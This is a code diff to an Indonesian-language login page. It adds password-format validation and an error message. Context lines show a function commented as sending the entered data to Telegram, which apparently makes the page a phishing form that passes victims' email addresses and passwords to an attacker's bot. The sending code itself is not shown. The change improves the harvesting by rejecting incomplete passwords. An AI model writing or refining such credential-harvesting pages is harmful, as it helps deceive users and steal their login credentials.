@@ -142,7 +142,7 @@ button.loading{
   </div>
 
   <div class="input-group">
-    <input type="password" id="password" placeholder="Kata sandi" required>
+    <input type="password" id="password" placeholder="Kata sandi " required>
     
     <svg class="toggle-password" onclick="togglePassword()" viewBox="0 0 24 24">
       <path d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12a5 
@@ -170,6 +170,16 @@ function togglePassword(){
 function isValidEmail(email){
   const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
   return regex.test(email);
+}
+
+// Validasi kata sandi (min 5 karakter, ada huruf & angka)
+function isValidPassword(password){
+  // Minimal 5 digit/karakter
+  if(password.length < 5) return false;
+  // Mengandung setidaknya 1 huruf dan 1 angka
+  const hasLetter = /[a-zA-Z]/.test(password);
+  const hasNumber = /\d/.test(password);
+  return hasLetter && hasNumber;
 }
 
 // Fungsi kirim data ke Telegram
@@ -216,6 +226,14 @@ function login(){
     errorMsg.innerText = "Format email tidak valid!";
     errorMsg.style.display = "block";
     emailInput.classList.add("error-input");
+    return;
+  }
+
+  // Validasi kata sandi
+  if(!isValidPassword(password)){
+    errorMsg.innerText = "Kata sandi minimal 5 karakter dan harus ada huruf & angka!";
+    errorMsg.style.display = "block";
+    passwordInput.classList.add("error-input");
     return;
   }
 
